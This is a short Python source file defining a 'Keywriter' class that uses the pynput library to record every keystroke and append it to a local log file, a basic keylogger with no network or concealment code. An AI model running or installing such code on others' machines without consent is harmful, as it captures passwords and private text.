from pynput.keyboard import Listener


class Keywriter:
    def __init__(self, log_file):
        self.log_file = log_file

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)

        with open(self.log_file, "a") as file:
            file.write(char)

    def start_logging(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()